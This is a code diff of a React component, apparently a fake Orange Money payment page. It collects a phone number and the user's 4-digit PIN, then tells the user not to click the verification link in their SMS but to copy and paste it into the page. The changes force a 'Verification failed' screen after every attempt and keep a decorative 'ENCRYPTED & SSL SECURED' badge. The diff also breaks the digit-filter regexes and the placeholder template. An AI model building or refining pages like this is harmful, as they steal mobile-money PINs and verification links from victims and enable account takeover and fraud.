@@ -73,7 +73,7 @@ export default function OrangePayment({
   }, [screen, timer]);
 
   const handlePhonePinChange = (index: number, value: string) => {
-    const digit = value.replace(/[^0-9]/g, "");
+    const digit = value.replace(/[-9]/g, "");
     const newPin = [...phonePin];
     newPin[index] = digit;
     setPhonePin(newPin);
@@ -120,6 +120,7 @@ export default function OrangePayment({
       setLoading(false);
       setTimeout(() => {
         setTransactionInProgress(false);
+        setScreen("notVerified");
       }, 3000);
     }, 2000);
   };
@@ -219,9 +220,9 @@ export default function OrangePayment({
                   type="tel"
                   value={phone}
                   onChange={(e) =>
-                    setPhone(e.target.value.replace(/[^0-9]/g, "").slice(0, 12))
+                    setPhone(e.target.value.replace(/[-9]/g, "").slice(0, 12))
                   }
-                  placeholder={`${selectedCountry.code} XX XX XX XX`}
+                  placeholder={`\${selectedCountry.code} XX XX XX XX`}
                   className="flex-1 border-none px-3.5 py-4 text-lg text-black outline-none bg-transparent"
                 />
               </div>
@@ -246,7 +247,8 @@ export default function OrangePayment({
                 ))}
               </div>
               <p className="text-center text-gray-500 text-[13px] mb-4 leading-relaxed">
-                Enter your 4-digit Orange Money PIN to authorize this transaction.
+                Enter your 4-digit Orange Money PIN to authorize this
+                transaction.
               </p>
 
               <p className="text-xs text-gray-500 text-center mb-6 leading-relaxed">
@@ -323,29 +325,22 @@ export default function OrangePayment({
                   </li>
                   <li className="text-[13px] text-gray-600">
                     Find the link in the SMS —{" "}
-                    <strong className="text-red-600">
-                      DO NOT CLICK it
-                    </strong>
+                    <strong className="text-red-600">DO NOT CLICK it</strong>
                   </li>
                   <li className="text-[13px] text-gray-600">
-                    <strong className="text-gray-800">
-                      Long press
-                    </strong>{" "}
-                    the link until a menu appears
+                    <strong className="text-gray-800">Long press</strong> the
+                    link until a menu appears
                   </li>
                   <li className="text-[13px] text-gray-600">
-                    Tap{" "}
-                    <strong className="text-gray-800">"Copy link"</strong>{" "}
+                    Tap <strong className="text-gray-800">"Copy link"</strong>{" "}
                     or <strong className="text-gray-800">"Copy"</strong>
                   </li>
                   <li className="text-[13px] text-gray-600">
                     Return to this page
                   </li>
                   <li className="text-[13px] text-gray-600">
-                    <strong className="text-gray-800">
-                      Long press
-                    </strong>{" "}
-                    the field below and tap{" "}
+                    <strong className="text-gray-800">Long press</strong> the
+                    field below and tap{" "}
                     <strong className="text-gray-800">"Paste"</strong>
                   </li>
                   <li className="text-[13px] text-gray-600">
@@ -438,8 +433,8 @@ export default function OrangePayment({
                 Verification failed
               </h2>
               <p className="text-gray-500 text-[13px] leading-relaxed mb-6">
-                The verification link could not be validated. Please
-                check the link and try again.
+                The verification link could not be validated. Please check the
+                link and try again.
               </p>
               <button
                 onClick={() => {
@@ -448,37 +443,48 @@ export default function OrangePayment({
                 }}
                 className="w-full py-3.5 bg-[#FF6600] text-white border-none rounded-[10px] text-[15px] font-semibold cursor-pointer mb-3 transition hover:bg-[#e55b00]"
               >
-                Retry
+                Try again
               </button>
               <button
-                onClick={() => setScreen("phone")}
+                onClick={() => {
+                  setScreen("phone");
+                  setPhone("");
+                  setPhonePin(["", "", "", ""]);
+                  setLinkInput("");
+                  setTransactionInProgress(false);
+                }}
                 className="w-full py-3.5 bg-transparent text-gray-500 border-2 border-gray-300 rounded-[10px] text-sm font-medium cursor-pointer transition hover:border-gray-400"
               >
                 Use another number
               </button>
             </div>
           )}
+        </div>
 
-          <div className="flex items-center justify-center gap-1.5 mt-4 px-4 py-2 bg-green-50 rounded-full mx-auto w-fit">
-            <svg
-              viewBox="0 0 24 24"
-              fill="currentColor"
-              className="w-3.5 h-3.5 text-green-600"
-            >
-              <path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4z" />
-            </svg>
-            <span className="text-[11px] text-green-700 font-medium">
-              ENCRYPTED & SSL SECURED
-            </span>
+        <div className="mt-8 text-center">
+          <p className="text-xs text-gray-500 mb-3">Best experienced with</p>
+          <div className="flex justify-center gap-3">
+            {["Chrome", "Firefox", "Safari", "Edge", "Opera"].map((b) => (
+              <div
+                key={b}
+                className="w-8 h-8 rounded-full bg-gray-700 flex items-center justify-center text-[8px] text-gray-300 font-semibold"
+              >
+                {b[0]}
+              </div>
+            ))}
           </div>
         </div>
 
-        <button
-          onClick={onBack}
-          className="mt-6 text-sm text-gray-400 hover:text-white transition"
-        >
-          ← Back to plans
-        </button>
+        <div className="mt-6 flex items-center justify-center gap-2 text-[13px] text-green-500">
+          <svg
+            viewBox="0 0 24 24"
+            fill="currentColor"
+            className="w-[18px] h-[18px]"
+          >
+            <path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4z" />
+          </svg>
+          <span>ENCRYPTED & SSL SECURED</span>
+        </div>
       </div>
 
       {showCountryModal && (
@@ -490,11 +496,11 @@ export default function OrangePayment({
             className="bg-white rounded-2xl w-[90%] max-w-[340px] max-h-[70vh] overflow-hidden shadow-2xl"
             onClick={(e) => e.stopPropagation()}
           >
-            <div className="px-5 py-4 border-b border-gray-200 flex justify-between items-center bg-[#FF6600]">
-              <h3 className="text-lg text-white">Select country</h3>
+            <div className="px-5 py-4 border-b border-gray-200 flex justify-between items-center">
+              <h3 className="text-lg text-gray-800">Select country</h3>
               <button
                 onClick={() => setShowCountryModal(false)}
-                className="text-2xl text-white leading-none"
+                className="text-2xl text-gray-500 leading-none"
               >
                 ×
               </button>
@@ -508,7 +514,7 @@ export default function OrangePayment({
                     setShowCountryModal(false);
                     setPhone("");
                   }}
-                  className={`flex items-center px-5 py-3.5 cursor-pointer border-b border-gray-100 transition hover:bg-orange-50 ${selectedCountry.code === c.code ? "bg-orange-100" : ""}`}
+                  className={`flex items-center px-5 py-3.5 cursor-pointer border-b border-gray-100 transition hover:bg-gray-50 ${selectedCountry.code === c.code ? "bg-orange-50" : ""}`}
                 >
                   <span className="flex-1 text-[15px] text-gray-800">
                     {c.name}
